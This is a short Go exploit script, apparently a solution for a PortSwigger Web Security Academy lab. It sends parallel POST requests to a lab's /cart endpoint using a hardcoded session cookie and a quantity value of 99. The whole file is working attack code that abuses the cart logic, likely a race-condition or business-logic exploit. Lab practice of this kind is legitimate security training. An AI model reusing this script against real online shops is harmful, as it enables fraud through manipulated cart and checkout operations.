package main

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
)

var (
	go_routines = 1
	main_url    = "https://0a4900540375cc6485b83f0f00e70088.web-security-academy.net/cart" // should NOT end with "/"
	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	var wg sync.WaitGroup

	for i := 0; i < go_routines; i++ {
		wg.Add(1)
		go flow(&wg)
	}

	wg.Wait()
}

func flow(wg *sync.WaitGroup) {
	defer wg.Done()

	data := strings.NewReader(fmt.Sprintf("productId=1&redir=PRODUCT&quantity=99"))

	req, _ := http.NewRequest(http.MethodPost, main_url, data)
	req.Header.Add("Cookie", "session=6An9TNCA4atk2z4sYOqgi1JVegAPjZMh")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http_client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
